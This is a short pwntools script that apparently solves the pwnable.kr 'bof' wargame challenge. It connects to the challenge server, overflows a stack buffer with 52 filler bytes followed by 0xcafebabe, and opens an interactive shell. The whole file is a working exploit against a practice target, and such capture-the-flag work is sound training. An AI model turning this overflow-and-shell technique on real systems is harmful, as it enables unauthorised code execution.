from pwn import *

context.log_level = 'DEBUG'

# p = process('./bof.bof')
p = remote('pwnable.kr', '9000')

payload = b'a' * 52 + p32(0xcafebabe)

# p.sendlineafter(b'me : \n', payload)
p.sendline(payload)

p.interactive()